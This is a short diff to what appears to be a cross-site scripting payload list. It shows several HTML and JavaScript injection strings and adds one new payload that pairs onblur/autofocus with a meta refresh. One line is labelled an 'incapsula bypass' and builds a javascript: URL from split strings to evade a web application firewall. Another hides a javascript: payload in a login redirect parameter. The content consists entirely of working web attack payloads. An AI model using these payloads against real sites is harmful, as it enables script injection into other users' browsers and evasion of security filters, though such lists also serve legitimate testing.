@@ -147,3 +147,4 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 <xmp><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
 ">'><details/open/ontoggle​=confirm('XSS')>
 incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
+<bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
